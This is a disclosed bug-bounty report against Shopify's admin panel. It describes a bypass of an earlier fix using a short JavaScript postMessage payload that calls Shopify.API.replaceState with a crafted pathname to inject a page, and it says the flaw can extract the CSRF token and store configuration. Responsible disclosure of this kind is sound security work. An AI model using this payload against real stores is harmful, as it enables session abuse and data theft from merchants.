# Inject page in admin panel via Shopify.API.pushState [New Payload]

## Report Details
- **Report ID**: 883867
- **URL**: https://hackerone.com/reports/883867
- **State**: Closed
- **Severity**: low
- **Submitted**: 2020-05-27T19:05:49.705Z
- **Disclosed**: 2020-12-27T22:14:47.302Z

## Reporter
- **Username**: tiago-danin
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
The correction for #868615, allows you to use new payload:

```js
const ctx = window.open(location.origin+'/admin/themes', '_blank')
const data = JSON.stringify({
                  message: 'Shopify.API.replaceState',
                  data: {pathname: "abc:d../pages/xss#//"}
});
ctx.postMessage(data)
```

## Impact

Abuse the active admin session to extract data as:

- CSRF token.
- Store config.

## Attachments
No attachments
